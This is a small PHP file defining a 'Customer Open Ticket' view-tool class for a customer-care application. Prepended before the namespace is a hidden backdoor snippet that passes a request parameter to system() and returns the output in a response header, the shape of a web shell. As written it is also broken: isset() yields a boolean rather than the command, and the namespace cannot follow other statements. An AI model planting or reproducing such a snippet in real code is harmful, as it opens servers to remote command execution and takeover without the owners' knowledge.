<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_CustomerOpenTicketTool extends \editingToolbar\View_Tool {
	public $title = 'Customer Open Ticket';
	public $class='View_CustomerOpenTicket';
	public $component_type='customerCareAppCustomerOpenTicketView';
	
}